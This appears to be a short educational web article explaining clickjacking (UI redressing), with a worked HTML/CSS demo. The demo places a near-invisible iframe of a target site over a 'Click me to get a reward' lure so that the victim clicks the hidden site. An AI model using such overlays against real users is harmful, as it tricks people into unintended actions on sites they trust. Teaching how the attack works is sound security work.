Clickjacking / UI redressing

In this article we will discuss -

  • What is clickjacking?
  • Making a basic clickjacking attack

    • What is click-jacking?

    Click Jacking is a UI-based attack in which the user is fooled into clicking on functional content from some other website hidden by the attacker on a different website. let's understand this with an example:

    Imagine, you're searching for a website to help with your homework You click on what seems like a helpful resource, and when clicked it secretly posts a promotional message on your social media profile without even letting you know about it, this deceptive tactic is known as a clickjacking attack.

    Making a basic clickjacking attack

    Most of the attackers use CSS to stack layers up on another layer loaded in an iframe, which tricks a user into clicking the iframe hidden beneath. Here's a code demo of click-jacking Attack:- 

                
<html>
<head>
    <style>
        #attacked_Site {
            position: relative;
            width: 128px;
            height: 128px;
            opacity: 0.00001;
            z-index: 2;
        }
        #trap_site {
            position: absolute;
            width: 300px;
            height: 400px;
            z-index: 1;
        }
    </style>
</head>
<body>
    <div id="trap_site">
    <p> Click me to get a reward  </p>
    </div>
    <iframe id="attacked_Site" src="https://example.com">
    </iframe>
</body>
</html>
